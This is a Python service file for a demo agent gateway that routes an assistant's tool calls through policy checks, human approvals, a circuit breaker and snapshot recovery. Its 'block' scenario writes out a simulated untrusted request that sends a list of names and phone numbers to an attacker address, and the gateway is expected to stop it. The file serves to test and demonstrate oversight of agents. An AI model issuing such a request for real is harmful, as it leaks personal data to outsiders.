from __future__ import annotations

"""Task orchestration service bridging the HTTP contract and the core engine.

The service keeps HTTP-facing state (tasks, approvals, incidents) while all
policy decisions and tool executions are performed by the deterministic
PolicyEngine / MCPGateway from backend. No business result is invented here:
every event originates from the gateway audit trail or an explicit
service-level lifecycle action (expiry, circuit breaker, snapshot restore).
"""

from dataclasses import asdict
from datetime import datetime, timedelta, timezone
from typing import Callable, Dict, List, Optional
from uuid import uuid4

from backend.mcp_gateway import MCPGateway, ToolRegistry
from backend.mock_tools import MockWorkspace
from backend.models import AuditEvent, ToolRequest, TrustLevel
from backend.recovery import SnapshotManager

APPROVAL_TTL_SECONDS = 60
CIRCUIT_FAILURE_THRESHOLD = 3

DEMO_USER = {
    "user_id": "example-user-001",
    "username": "example.operator",
    "display_name": "示例操作员",
    "avatar_url": None,
    "role": "operator",
}


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def request_to_dict(request: ToolRequest) -> Dict[str, object]:
    value = asdict(request)
    value["source_trust"] = request.source_trust.value
    return value


class TaskService:
    """Runs demo scenarios through the real gateway and exposes Task state."""

    def __init__(
        self,
        workspace: Optional[MockWorkspace] = None,
        snapshots: Optional[SnapshotManager] = None,
        now_fn: Callable[[], datetime] = lambda: datetime.now(timezone.utc),
    ) -> None:
        self.workspace = workspace or MockWorkspace()
        self.snapshots = snapshots or SnapshotManager(self.workspace)
        self._now_fn = now_fn
        self.gateway: Optional[MCPGateway] = None
        self._tasks: Dict[str, Dict[str, object]] = {}
        self._approvals: Dict[str, Dict[str, object]] = {}
        self._incidents: Dict[str, Dict[str, object]] = {}
        self._requests: Dict[str, ToolRequest] = {}
        self._file_failures_pending = 0

    # ------------------------------------------------------------------ setup
    def bind_gateway(self, gateway: MCPGateway) -> None:
        self.gateway = gateway

    def register_tools(self, registry: ToolRegistry) -> None:
        """Register workspace tools; file updates route through failure logic."""

        def file_tool(action: str, arguments: Dict[str, object]) -> Dict[str, object]:
            if (
                action == "update"
                and self._file_failures_pending > 0
                and str(arguments.get("path", "")).startswith("/workspace/activities/")
            ):
                self._file_failures_pending -= 1
                if self._file_failures_pending == CIRCUIT_FAILURE_THRESHOLD - 1:
                    # First attempt damages the file before the timeout fires.
                    self.workspace.files[arguments["path"]] = arguments["content"]
                raise TimeoutError("模拟文件服务超时")
            return self.workspace.file_tool(action, arguments)

        registry.register("calendar", self.workspace.calendar_tool)
        registry.register("send_notice", self.workspace.notice_tool)
        registry.register("shared_file", file_tool)

    # ------------------------------------------------------------- task state
    def _new_task(
        self,
        title: str,
        description: str,
        scenario: str,
        files: List[Dict[str, object]],
        permissions: List[str],
    ) -> Dict[str, object]:
        moment = self._now_fn().isoformat()
        return {
            "task_id": str(uuid4()),
            "title": title,
            "description": description,
            "scenario": scenario,
            "status": "EXECUTING",
            "created_at": moment,
            "updated_at": moment,
            "files": files,
            "permissions": permissions,
            "events": [],
            "replay": False,
        }

    def _set_status(self, task: Dict[str, object], status: str) -> None:
        task["status"] = status
        task["updated_at"] = self._now_fn().isoformat()

    # ----------------------------------------------------------------- events
    def _serialize_event(self, audit_event: AuditEvent) -> Dict[str, object]:
        payload = dict(audit_event.payload)
        request = self._requests.get(audit_event.request_id)
        if request is not None:
            payload["tool_request"] = request_to_dict(request)
        if audit_event.request_id in self._approvals:
            approval = self._approvals[audit_event.request_id]
            payload.setdefault("approval_id", approval["approval_id"])
            payload.setdefault("expires_at", approval["expires_at"])
        return {
            "event_id": audit_event.event_id,
            "event_type": audit_event.event_type,
            "request_id": audit_event.request_id,
            "task_id": audit_event.task_id,
            "created_at": audit_event.created_at,
            "payload": payload,
        }

    def _task_events(self, task_id: str) -> List[Dict[str, object]]:
        assert self.gateway is not None
        return [
            self._serialize_event(event)
            for event in self.gateway.audit_events
            if event.task_id == task_id
        ]

    def _record_service_event(
        self,
        task_id: str,
        event_type: str,
        payload: Dict[str, object],
        request_id: str = "",
    ) -> None:
        assert self.gateway is not None
        self.gateway.audit_events.append(
            AuditEvent(event_type, request_id, task_id, payload)
        )

    # ---------------------------------------------------------------- queries
    def list_tasks(self) -> List[Dict[str, object]]:
        return [self.task(task_id) for task_id in reversed(list(self._tasks))]

    def task(self, task_id: str) -> Dict[str, object]:
        task = self._tasks.get(task_id)
        if task is None:
            raise KeyError(task_id)
        result = dict(task)
        result["events"] = self._task_events(task_id)
        return result

    def task_events(self, task_id: str) -> List[Dict[str, object]]:
        if task_id not in self._tasks:
            raise KeyError(task_id)
        return self._task_events(task_id)

    def list_approvals(self) -> List[Dict[str, object]]:
        return [dict(a) for a in reversed(list(self._approvals.values()))]

    def list_incidents(self) -> List[Dict[str, object]]:
        return [dict(i) for i in reversed(list(self._incidents.values()))]

    def incident(self, incident_id: str) -> Dict[str, object]:
        incident = self._incidents.get(incident_id)
        if incident is None:
            raise KeyError(incident_id)
        return dict(incident)

    # ------------------------------------------------------------ create task
    def create_task(
        self,
        title: str,
        description: str,
        scenario: str = "normal",
        files: Optional[List[Dict[str, object]]] = None,
        permissions: Optional[List[str]] = None,
    ) -> Dict[str, object]:
        if scenario not in {"normal", "approval", "block", "recovery"}:
            raise ValueError("scenario must be normal | approval | block | recovery")
        task = self._new_task(title, description, scenario, files or [], permissions or [])
        self._tasks[task["task_id"]] = task
        try:
            if scenario == "normal":
                self._run_normal(task)
            elif scenario == "approval":
                self._run_approval(task)
            elif scenario == "block":
                self._run_block(task)
            else:
                self._run_recovery(task)
        except Exception:
            self._set_status(task, "FAILED")
            raise
        return self.task(task["task_id"])

    def _submit(self, task: Dict[str, object], request: ToolRequest) -> Dict[str, object]:
        assert self.gateway is not None
        self._requests[request.request_id] = request
        result = self.gateway.submit(request)
        if result.status == "PENDING_CONFIRMATION":
            self._open_approval(task, request)
        return result.to_dict()

    # -------------------------------------------------------------- scenarios
    def _run_normal(self, task: Dict[str, object]) -> None:
        calendar = ToolRequest(
            task_id=str(task["task_id"]),
            agent_id="activity-assistant",
            tool_name="calendar",
            action="create",
            arguments={
                "title": str(task["title"]) or "公益活动",
                "starts_at": "2026-11-08T09:00:00+08:00",
                "location": "社区服务中心",
            },
            source_trust=TrustLevel.USER_CONFIRMED,
        )
        notice = ToolRequest(
            task_id=str(task["task_id"]),
            agent_id="activity-assistant",
            tool_name="send_notice",
            action="send",
            arguments={
                "recipient": "participants@example.org",
                "recipient_count": 10,
                "content": str(task["description"]) or "活动安排通知。",
            },
            source_trust=TrustLevel.USER_CONFIRMED,
        )
        self._submit(task, calendar)
        self._submit(task, notice)
        self._set_status(task, "COMPLETED")

    def _run_approval(self, task: Dict[str, object]) -> None:
        notice = ToolRequest(
            task_id=str(task["task_id"]),
            agent_id="activity-assistant",
            tool_name="send_notice",
            action="send",
            arguments={
                "recipient": "participants@example.org",
                "recipient_count": 40,
                "content": str(task["description"]) or "活动安排通知。",
            },
            source_trust=TrustLevel.USER_CONFIRMED,
        )
        result = self._submit(task, notice)
        if result["status"] == "PENDING_CONFIRMATION":
            self._set_status(task, "WAITING_APPROVAL")
        else:  # pragma: no cover - policy threshold change guard
            self._set_status(task, "COMPLETED")

    def _run_block(self, task: Dict[str, object]) -> None:
        calendar = ToolRequest(
            task_id=str(task["task_id"]),
            agent_id="activity-assistant",
            tool_name="calendar",
            action="create",
            arguments={
                "title": str(task["title"]) or "公益活动",
                "starts_at": "2026-11-08T09:00:00+08:00",
                "location": "社区服务中心",
            },
            source_trust=TrustLevel.USER_CONFIRMED,
        )
        self._submit(task, calendar)
        malicious = ToolRequest(
            task_id=str(task["task_id"]),
            agent_id="activity-assistant",
            tool_name="send_notice",
            action="send",
            arguments={
                "recipient": "attacker@outside.example",
                "recipient_count": 1,
                "content": "附件名单",
                "fields": ["name", "phone"],
            },
            source_trust=TrustLevel.EXTERNAL_UNTRUSTED,
        )
        result = self._submit(task, malicious)
        self._set_status(task, "BLOCKED" if result["status"] == "BLOCKED" else "COMPLETED")

    def _run_recovery(self, task: Dict[str, object]) -> None:
        self.snapshots.create(str(task["task_id"]))
        # The approved request is executed by gateway.resolve(). Arm the test
        # wrapper first so that execution becomes the first circuit failure.
        self._file_failures_pending = CIRCUIT_FAILURE_THRESHOLD
        update = ToolRequest(
            task_id=str(task["task_id"]),
            agent_id="activity-assistant",
            tool_name="shared_file",
            action="update",
            arguments={
                "path": "/workspace/activities/roster.csv",
                "content": "name,role\n用户A,待分配",
            },
            source_trust=TrustLevel.USER_CONFIRMED,
        )
        result = self._submit(task, update)
        if result["status"] == "PENDING_CONFIRMATION":
            self._set_status(task, "WAITING_APPROVAL")
        else:  # pragma: no cover
            self._set_status(task, "COMPLETED")

    # -------------------------------------------------------------- approvals
    def _decision_reasons(self, request_id: str) -> List[Dict[str, object]]:
        assert self.gateway is not None
        for event in reversed(self.gateway.audit_events):
            if event.request_id == request_id and event.event_type == "POLICY_DECISION":
                return list(event.payload.get("reasons", []))
        return []

    def _approval_summary(self, request: ToolRequest) -> str:
        if request.tool_name == "send_notice":
            count = request.arguments.get("recipient_count", 1)
            return "向 {} 名活动参与者发送通知".format(count)
        if request.tool_name == "shared_file":
            return "更新共享排班文件"
        return "执行 {} / {}".format(request.tool_name, request.action)

    def _open_approval(self, task: Dict[str, object], request: ToolRequest) -> None:
        expires = self._now_fn() + timedelta(seconds=APPROVAL_TTL_SECONDS)
        self._approvals[request.request_id] = {
            "approval_id": request.request_id,
            "request_id": request.request_id,
            "task_id": str(task["task_id"]),
            "summary": self._approval_summary(request),
            "status": "PENDING",
            "expires_at": expires.isoformat(),
            "resolved_at": None,
            "tool_request": request_to_dict(request),
            "reasons": self._decision_reasons(request.request_id),
        }

    def decide(self, approval_id: str, approved: bool) -> Dict[str, object]:
        assert self.gateway is not None
        approval = self._approvals.get(approval_id)
        if approval is None:
            raise KeyError(approval_id)
        if approval["status"] != "PENDING":
            raise PermissionError(
                "approval already resolved: {}".format(approval["status"])
            )
        if self._now_fn() >= datetime.fromisoformat(str(approval["expires_at"])):
            approval["status"] = "EXPIRED"
            approval["resolved_at"] = self._now_fn().isoformat()
            self.gateway.pending.pop(approval_id, None)
            task = self._tasks.get(str(approval["task_id"]))
            if task is not None:
                self._set_status(task, "EXPIRED")
                self._record_service_event(
                    str(task["task_id"]),
                    "APPROVAL_EXPIRED",
                    {"approval_id": approval_id, "summary": "到期未确认，操作已取消"},
                    approval_id,
                )
            return dict(approval)

        self.gateway.resolve(approval_id, approved)
        approval["status"] = "APPROVED" if approved else "REJECTED"
        approval["resolved_at"] = self._now_fn().isoformat()
        task = self._tasks.get(str(approval["task_id"]))
        if task is None:  # pragma: no cover
            return dict(approval)
        if not approved:
            self._set_status(task, "REJECTED")
            return dict(approval)
        if task["scenario"] == "recovery":
            self._recover(task)
        else:
            self._set_status(task, "COMPLETED")
        return dict(approval)

    # --------------------------------------------------------------- recovery
    def _recover(self, task: Dict[str, object]) -> None:
        """Run two audited retries, trip the breaker, then restore the snapshot.

        The first failure has already happened through gateway.resolve(); these
        remaining attempts deliberately bypass submit() because an already
        confirmed request must be executed, not queued for approval again.
        """
        assert self.gateway is not None
        self._set_status(task, "RECOVERING")
        retry = ToolRequest(
            task_id=str(task["task_id"]),
            agent_id="activity-assistant",
            tool_name="shared_file",
            action="update",
            arguments={
                "path": "/workspace/activities/roster.csv",
                "content": "name,role\n用户A,待分配",
            },
            source_trust=TrustLevel.USER_CONFIRMED,
        )
        self._requests[retry.request_id] = retry
        damaged_content = self.workspace.files.get(
            "/workspace/activities/roster.csv", ""
        )

        # Two more failures reach the configured threshold of three. Evaluate
        # and audit each attempt so the replay trail remains policy-complete.
        for attempt in range(2, CIRCUIT_FAILURE_THRESHOLD + 1):
            decision = self.gateway.engine.evaluate(retry)
            self.gateway.audit_events.append(
                AuditEvent(
                    "POLICY_DECISION",
                    retry.request_id,
                    retry.task_id,
                    decision.to_dict(),
                )
            )
            try:
                self.gateway.registry.execute(retry)
            except Exception as exc:  # deliberately injected tool failure
                self.gateway.audit_events.append(
                    AuditEvent(
                        "TOOL_FAILED",
                        retry.request_id,
                        retry.task_id,
                        {"error": str(exc), "attempt": attempt},
                    )
                )

        before_snapshot = self.snapshots.snapshots.get(str(task["task_id"]), {})
        before = before_snapshot.get("files", {}).get(
            "/workspace/activities/roster.csv", ""
        )
        incident = {
            "incident_id": str(uuid4()),
            "task_id": str(task["task_id"]),
            "reason": "共享文件工具连续超时，达到 {} 次熔断阈值。".format(
                CIRCUIT_FAILURE_THRESHOLD
            ),
            "status": "RECOVERING",
            "created_at": self._now_fn().isoformat(),
            "before": before,
            "damaged": damaged_content,
            "after": None,
            "cancelled_count": 1,
        }
        self._incidents[incident["incident_id"]] = incident
        self._record_service_event(
            str(task["task_id"]),
            "INCIDENT_TRIGGERED",
            {
                "summary": "共享文件更新连续失败 3 次，停止后续动作",
                "incident_id": incident["incident_id"],
            },
        )
        self._record_service_event(
            str(task["task_id"]),
            "ACTION_CANCELLED",
            {"summary": "已取消尚未发送的活动通知", "count": 1},
        )
        self.snapshots.restore(str(task["task_id"]))
        incident["after"] = self.workspace.files.get(
            "/workspace/activities/roster.csv", ""
        )
        incident["status"] = "RECOVERED"
        self._record_service_event(
            str(task["task_id"]),
            "SNAPSHOT_RESTORED",
            {
                "summary": "共享排班文件恢复到操作前快照",
                "path": "/workspace/activities/roster.csv",
            },
        )
        self._record_service_event(
            str(task["task_id"]),
            "RECOVERY_COMPLETED",
            {"summary": "模拟文件已恢复，后续通知已取消"},
        )
        self._set_status(task, "RECOVERED")
